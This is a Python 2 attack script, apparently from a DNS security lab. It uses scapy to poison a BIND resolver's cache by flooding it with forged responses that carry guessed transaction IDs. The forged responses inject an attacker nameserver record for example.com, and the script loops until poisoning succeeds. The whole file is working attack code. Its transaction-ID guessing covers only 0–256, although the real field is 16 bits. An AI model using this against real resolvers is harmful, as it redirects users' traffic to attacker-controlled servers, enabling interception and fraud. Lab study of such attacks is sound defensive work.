#!/usr/bin/env python2
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help= "port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# BIND's ip address
dns_addr = args.ip #127.0.0.1
# BIND's port
dns_port = args.port
# port that BIND uses to send its DNS queries
my_query_port = args.query_port #2210

spoof_addr = "1.2.3.4"
spoof_ns = "ns.dnslabattacker.net"
spoof_domain = "example.com"

ttl_value = 90000

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    while True:
        spoof_sub_domain = getRandomSubDomain() + '.' + spoof_domain
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        dnsPacket = DNS(rd=1, qd=DNSQR(qname=spoof_sub_domain))
        sendPacket(sock, dnsPacket, dns_addr, dns_port)

        #spoof DNS
        dns_rsps = DNS(qr=1, aa=1, qdcount=1, ancount=1, nscount=1, arcount=0,
                    qd=DNSQR(qname=spoof_sub_domain),
                    an=DNSRR(rrname=spoof_sub_domain, type='A', rdata=spoof_addr, ttl=ttl_value),
                    ns=DNSRR(rrname=spoof_domain, type='NS', rdata=spoof_ns, ttl=ttl_value))
        dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        for _ in range(125):
            dns_rsps.getlayer(DNS).id = getRandomTXID()
            print(dns_rsps.getlayer(DNS).id)
            sendPacket(dns_sock, dns_rsps, dns_addr, my_query_port) # send fake response to BIND's query_port

        dns_sock.close()

        response = sock.recv(4096)
        response = DNS(response)
        print "\n***** Packet Received from Remote Server *****"
        print response.show()
        print "***** End of Remote Server Packet *****\n"
        if response[DNS].an and response[DNS].an.rdata == spoof_addr:
            print("Attacked")
            sock.close()
            break

if __name__ == '__main__':
    exampleSendDNSQuery()
